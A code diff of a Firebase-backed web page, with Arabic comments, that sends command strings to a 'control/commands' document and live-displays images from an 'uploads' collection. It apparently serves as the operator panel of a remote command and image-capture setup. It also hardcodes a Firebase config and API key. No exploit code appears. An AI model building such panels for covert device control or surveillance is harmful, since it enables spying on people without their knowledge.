@@ -1,7 +1,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js";
-import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js";
+import { getFirestore, doc, setDoc, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js";
 
-// إعدادات Firebase التي زودتني بها
 const firebaseConfig = {
     apiKey: "AIzaSyDX0esBRiQ4MuyvWH_s2UZ2kJpA9GryDgE",
     authDomain: "tttttt-48c2e.firebaseapp.com",
@@ -13,24 +12,29 @@ const firebaseConfig = {
     measurementId: "G-QLCYC16T20"
 };
 
-// تهيئة النظام
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// تثبيت الدالة عالمياً لتتمكن أزرار HTML من الوصول إليها
+// تثبيت الدالة عالمياً لتعمل الأزرار
 window.sendCmd = async (command) => {
     try {
-        console.log("ارسال أمر:", command);
-        await setDoc(doc(db, "control", "commands"), { 
-            cmd: command, 
-            time: Date.now() 
-        });
-        // تغيير لون الزر مؤقتاً للتأكيد
-        console.log("تم تنفيذ الأمر بنجاح");
-    } catch (e) {
-        console.error("فشل في إرسال الأمر:", e);
-        alert("تأكد من نشر قواعد البيانات (Publish Rules) في Firebase");
-    }
+        await setDoc(doc(db, "control", "commands"), { cmd: command, time: Date.now() });
+        console.log("تم إرسال:", command);
+    } catch (e) { console.error("Error:", e); }
 };
 
-console.log("محرك الإدارة جاهز للعمل.");
+// مراقبة الصور الجديدة وعرضها فوراً
+const q = query(collection(db, "uploads"), orderBy("time", "desc"));
+onSnapshot(q, (snapshot) => {
+    const stream = document.getElementById('dataStream');
+    stream.innerHTML = "";
+    snapshot.forEach((doc) => {
+        const data = doc.data();
+        const img = document.createElement('img');
+        img.src = data.url;
+        img.style.width = "150px";
+        img.style.margin = "5px";
+        img.style.border = "1px solid #0f0";
+        stream.appendChild(img);
+    });
+});
